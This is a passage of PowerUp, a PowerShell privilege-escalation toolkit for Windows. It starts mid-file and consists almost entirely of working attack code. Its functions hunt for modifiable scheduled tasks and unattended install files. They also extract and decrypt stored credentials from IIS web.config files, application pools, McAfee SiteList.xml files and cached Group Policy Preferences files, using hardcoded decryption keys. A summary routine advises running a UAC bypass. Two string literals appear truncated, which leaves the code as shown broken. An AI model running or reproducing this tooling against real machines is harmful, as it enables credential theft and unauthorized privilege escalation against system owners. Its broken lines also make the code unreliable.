    $ErrorActionPreference = $OrigError
}








function Get-ModifiableScheduledTaskFile {


    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Path = "$($ENV:windir)\System32\Tasks"

    
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            $TaskName = $_.Name
            $TaskXML = [xml] (Get-Content $_.FullName)
            if($TaskXML.Task.Triggers) {

                $TaskTrigger = $TaskXML.Task.Triggers.OuterXML

                
                $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out
                }

                
                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out
                }
            }
        }
        catch {
            Write-Verbose "Error: $_"
        }
    }

    $ErrorActionPreference = $OrigError
}


function Get-UnattendedInstallFile {


    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )

    
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out
    }

    $ErrorActionPreference = $OrigError
}


function Get-WebConfig {


    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {

        
        $DataTable = New-Object System.Data.DataTable

        
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("dbserv")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("path")
        $Null = $DataTable.Columns.Add("encr")

        
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath | 
        ForEach-Object {

            $CurrentVdir = $_

            
            if ($_ -like "*%*") {
                $EnvarName = "`$Env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split("%")[2]
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {

                
                $CurrentPath = $_.fullname

                
                [xml]$ConfigFile = Get-Content $_.fullname

                
                if ($ConfigFile.configuration.connectionStrings.add) {

                    
                    $ConfigFile.configuration.connectionStrings.add| 
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if($MyConString -like "*password*") {
                            $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                            $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                            $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                            $ConfVdir = $CurrentVdir
                            $ConfPath = $CurrentPath
                            $ConfEnc = "No"
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                        }
                    }
                }
                else {

                    
                    $AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1

                    
                    if (Test-Path  ($AspnetRegiisPath.FullName)) {

                        
                        $WebConfigPath = (Get-Item $Env:temp).FullName + "\web.config"

                        
                        if (Test-Path  ($WebConfigPath)) {
                            Remove-Item $WebConfigPath
                        }

                        
                        Copy-Item $CurrentPath $WebConfigPath

                        
                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $AspnetRegiisCmd

                        
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        
                        if ($TMPConfigFile.configuration.connectionStrings.add) {

                            
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if($MyConString -like "*password*") {
                                    $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                                    $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                                    $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfPath = $CurrentPath
                                    $ConfEnc = 'Yes'
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                                }
                            }

                        }
                        else {
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False
                        }
                    }
                    else {
                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }
        }

        
        if( $DataTable.rows.Count -gt 0 ) {
            
            $DataTable |  Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
        }
        else {
            Write-Verbose 'No connection strings found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-ApplicationHost {
 

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        
        $DataTable = New-Object System.Data.DataTable

        
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            
            $PoolName = $_

            
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            
            $VdirName = $_

            
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        
        if( $DataTable.rows.Count -gt 0 ) {
            
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-SiteListPassword {


    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String[]]
        $Path
    )

    BEGIN {
        function Local:Get-DecryptedSitelistPassword {
            
            
            
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [String]
                $B64Pass
            )

            
            Add-Type -Assembly System.Security
            Add-Type -Assembly System.Core

            
            $Encoding = [System.Text.Encoding]::ASCII
            $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
            $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider

            
            $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

            
            $I = 0;
            $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }

            
            $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@

            
            $3DES.Mode = 'ECB'
            $3DES.Padding = 'None'
            $3DES.Key = $3DESKey

            
            $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)

            
            $Index = [Array]::IndexOf($Decrypted, [Byte]0)
            if($Index -ne -1) {
                $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
            }
            else {
                $DecryptedPass = $Encoding.GetString($Decrypted)
            }

            New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
        }

        function Local:Get-SitelistFields {
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [String]
                $Path
            )

            try {
                [Xml]$SiteListXml = Get-Content -Path $Path

                if($SiteListXml.InnerXml -Like "*password*") {
                    Write-Verbose "Potential password in found in $Path"

                    $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            $PasswordRaw = $_.Password.'

                            if($_.Password.Encrypted -eq 1) {
                                
                                $DecPassword = if($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
                            }
                            else {
                                $DecPassword = $PasswordRaw
                            }

                            $Server = if($_.ServerIP) { $_.ServerIP } else { $_.Server }
                            $Path = if($_.ShareName) { $_.ShareName } else { $_.RelativePath }

                            $ObjectProperties = @{
                                'Name' = $_.Name;
                                'Enabled' = $_.Enabled;
                                'Server' = $Server;
                                'Path' = $Path;
                                'DomainName' = $_.DomainName;
                                'UserName' = $_.UserName;
                                'EncPassword' = $PasswordRaw;
                                'DecPassword' = $DecPassword;
                            }
                            New-Object -TypeName PSObject -Property $ObjectProperties
                        }
                        catch {
                            Write-Verbose "Error parsing node : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error parsing file '$Path' : $_"
            }
        }
    }

    PROCESS {
        if($PSBoundParameters['Path']) {
            $XmlFilePaths = $Path
        }
        else {
            $XmlFilePaths = @('C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\')
        }

        $XmlFilePaths | Foreach-Object { Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue } | Where-Object { $_ } | Foreach-Object {
            Write-Verbose "Parsing SiteList.xml file '$($_.Fullname)'"
            Get-SitelistFields -Path $_.Fullname
        }
    }
}


function Get-CachedGPPPassword {

    
    [CmdletBinding()]
    Param()
    
    
    Set-StrictMode -Version 2

    
    Add-Type -Assembly System.Security
    Add-Type -Assembly System.Core
    
    
    function local:Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword 
        )

        try {
            
            $Mod = ($Cpassword.length % 4)
            
            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
            
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    
    
    function local:Get-GPPInnerFields {
        [CmdletBinding()]
        Param (
            $File 
        )
    
        try {
            
            $Filename = Split-Path $File -Leaf
            [XML] $Xml = Get-Content ($File)

            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
    
            
            if ($Xml.innerxml -like "*cpassword*"){
            
                Write-Verbose "Potential password in $File"
                
                switch ($Filename) {
                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Services.xml' {  
                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
                     
           foreach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               
               $Password += , $DecryptedPassword
           }
            
            
            if (-not $Password) {$Password = '[BLANK]'}
            if (-not $UserName) {$UserName = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}
                  
            
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
                
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) {Return $ResultsObject} 
        }

        catch {Write-Error $Error[0]}
    }
    
    try {
        $AllUsers = $Env:ALLUSERSPROFILE

        if($AllUsers -notmatch 'ProgramData') {
            $AllUsers = "$AllUsers\Application Data"
        }

        
        $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
    
        if ( -not $XMlFiles ) {
            Write-Verbose 'No preference files found.'
        }
        else {
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

            ForEach ($File in $XMLFiles) {
                Get-GppInnerFields $File.Fullname
            }
        }
    }

    catch {Write-Error $Error[0]}
}


function Invoke-AllChecks {


    [CmdletBinding()]
    Param(
        [Switch]
        $HTMLReport
    )

    if($HTMLReport) {
        

        ConvertTo-HTML -Fragment -Pre "<H1>PowerUp Report for $($Env:ComputerName) - $($Env:UserName)</H1>`n<div class='aLine'></div>" | Out-File -Append $HtmlReportFile
    }

    

    "`n[*] Running Invoke-AllChecks"

    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

    if($IsAdmin){
        "[+] Current user already has local administrative privileges!"

        if($HTMLReport) {
            ConvertTo-HTML -Fragment -Pre "<H2>User Has Local Admin Privileges!</H2>" | Out-File -Append $HtmlReportFile
        }
    }
    else{
        "`n`n[*] Checking if user is in a local group with administrative privileges..."

        $CurrentUserSids = Get-CurrentUserTokenGroupSid | Select-Object -ExpandProperty SID
        if($CurrentUserSids -contains 'S-1-5-32-544') {
            "[+] User is in a local group that grants administrative privileges!"
            "[+] Run a BypassUAC attack to elevate privileges to admin."

            if($HTMLReport) {
                ConvertTo-HTML -Fragment -Pre "<H2> User In Local Group With Administrative Privileges</H2>" | Out-File -Append $HtmlReportFile
            }
        }
    }


    

    "`n`n[*] Checking for unquoted service paths..."
    $Results = Get-ServiceUnquoted
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Unquoted Service Paths</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking service executable and argument permissions..."
    $Results = Get-ModifiableServiceFile
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Service File Permissions</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking service permissions..."
    $Results = Get-ModifiableService
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Modifiable Services</H2>" | Out-File -Append $HtmlReportFile
    }


    

    "`n`n[*] Checking %PATH% for potentially hijackable DLL locations..."
    $Results = Find-PathDLLHijack
    $Results = $Results | Where-Object {$_} | Select-Object ModifiablePath, "%PATH%", Permissions, IdentityReference
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>%PATH% .dll Hijacks</H2>" | Out-File -Append $HtmlReportFile
    }


    

    "`n`n[*] Checking for AlwaysInstallElevated registry key..."
    if (Get-RegistryAlwaysInstallElevated) {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'AbuseFunction' "Write-UserAddMSI"
        $Results = $Out

        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>AlwaysInstallElevated</H2>" | Out-File -Append $HtmlReportFile
        }
    }

    "`n`n[*] Checking for Autologon credentials in registry..."
    $Results = Get-RegistryAutoLogon
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Registry Autologons</H2>" | Out-File -Append $HtmlReportFile
    }


    "`n`n[*] Checking for modifiable registry autoruns and configs..."
    $Results = Get-ModifiableRegistryAutoRun
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Registry Autoruns</H2>" | Out-File -Append $HtmlReportFile
    }

    

    "`n`n[*] Checking for modifiable schtask files/configs..."
    $Results = Get-ModifiableScheduledTaskFile
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Modifiable Schtask Files</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for unattended install files..."
    $Results = Get-UnattendedInstallFile
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Unattended Install Files</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for encrypted web.config strings..."
    $Results = Get-Webconfig | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Encrypted 'web.config' String</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for encrypted application pool and virtual directory passwords..."
    $Results = Get-ApplicationHost | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Encrypted Application Pool Passwords</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for plaintext passwords in McAfee SiteList.xml files...."
    $Results = Get-SiteListPassword | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>McAfee's SiteList.xml's</H2>" | Out-File -Append $HtmlReportFile
    }
    "`n"

    "`n`n[*] Checking for cached Group Policy Preferences .xml files...."
    $Results = Get-CachedGPPPassword | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Cached GPP Files</H2>" | Out-File -Append $HtmlReportFile
    }
    "`n"

    if($HTMLReport) {
        "[*] Report written to '$HtmlReportFile' `n"
    }
}



$Module = New-InMemoryModule -ModuleName PowerUpModule

$FunctionDefinitions = @(
    (func kernel32 GetCurrentProcess ([IntPtr]) @())
    (func advapi32 OpenProcessToken ([Bool]) @( [IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
    (func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
    (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError)
)


$ServiceAccessRights = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
    QueryConfig =           '0x00000001'
    ChangeConfig =          '0x00000002'
    QueryStatus =           '0x00000004'
    EnumerateDependents =   '0x00000008'
    Start =                 '0x00000010'
    Stop =                  '0x00000020'
    PauseContinue =         '0x00000040'
    Interrogate =           '0x00000080'
    UserDefinedControl =    '0x00000100'
    Delete =                '0x00010000'
    ReadControl =           '0x00020000'
    WriteDac =              '0x00040000'
    WriteOwner =            '0x00080000'
    Synchronize =           '0x00100000'
    AccessSystemSecurity =  '0x01000000'
    GenericAll =            '0x10000000'
    GenericExecute =        '0x20000000'
    GenericWrite =          '0x40000000'
    GenericRead =           '0x80000000'
    AllAccess =             '0x000F01FF'
} -Bitfield

$SidAttributes = psenum $Module PowerUp.SidAttributes UInt32 @{
    SE_GROUP_ENABLED =              '0x00000004'
    SE_GROUP_ENABLED_BY_DEFAULT =   '0x00000002'
    SE_GROUP_INTEGRITY =            '0x00000020'
    SE_GROUP_INTEGRITY_ENABLED =    '0xC0000000'
    SE_GROUP_MANDATORY =            '0x00000001'
    SE_GROUP_OWNER =                '0x00000008'
    SE_GROUP_RESOURCE =             '0x20000000'
    SE_GROUP_USE_FOR_DENY_ONLY =    '0x00000010'
} -Bitfield

$SID_AND_ATTRIBUTES = struct $Module PowerUp.SidAndAttributes @{
    Sid         =   field 0 IntPtr
    Attributes  =   field 1 UInt32
}

$TOKEN_GROUPS = struct $Module PowerUp.TokenGroups @{
    GroupCount  = field 0 UInt32
    Groups      = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
}

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']